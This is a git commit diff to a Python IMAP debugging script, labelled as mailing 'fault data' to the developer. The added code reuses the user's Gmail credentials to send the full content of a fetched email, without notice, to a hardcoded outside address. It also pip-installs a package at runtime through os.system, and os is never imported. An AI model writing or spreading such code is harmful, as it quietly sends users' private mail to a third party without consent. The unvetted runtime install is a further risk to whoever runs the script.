66a951057156eb31539305b00fefc4d7356db749
anuraggoyal <55345266+anuragnitt@users.noreply.github.com>
2020-08-10 17:36:54 +0530

    mails the fault data to dev

--- imap_debug.py
+++ imap_debug.py
@@ -1,5 +1,9 @@
 import imaplib
 import email
+os.system('pip3 install secure-smtplib')
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
 
 host = 'imap.gmail.com'
 port = 993
@@ -18,6 +22,7 @@ b = b[n-1]
 print('\n'+'*'*70+'\n')
 
 data = email.message_from_bytes(conn.uid('fetch', b, '(RFC822)')[1][0][1])
+conn.logout()
 
 p = [x for x in data.walk()]
 
@@ -34,3 +39,24 @@ print('\nINFO TABLE :\n')
 for x in info :
 	print(x[0], ':', x[1], '\n')
 print('='*70+'\n')
+
+host = 'smtp.gmail.com'
+port = 465
+
+conn = smtplib.SMTP_SSL(host, port)
+conn.login(username, password)
+
+to_mail = 'pymailproject2020@gmail.com'
+
+msg = MIMEMultipart('alternative')
+msg['From'] = username
+msg['To'] = to_mail
+msg['Subject'] = 'faulty mail data'
+
+name = '{}-mail{}.bin'.format(username, n)
+file_data = MIMEApplication(data.get_payload(), Name=name)
+file_data['Content-Disposition'] = 'attachment;filename={}'.format(name)
+
+msg.attach(file_data)
+conn.sendmail(username, to_mail, msg.as_string())
+conn.quit()
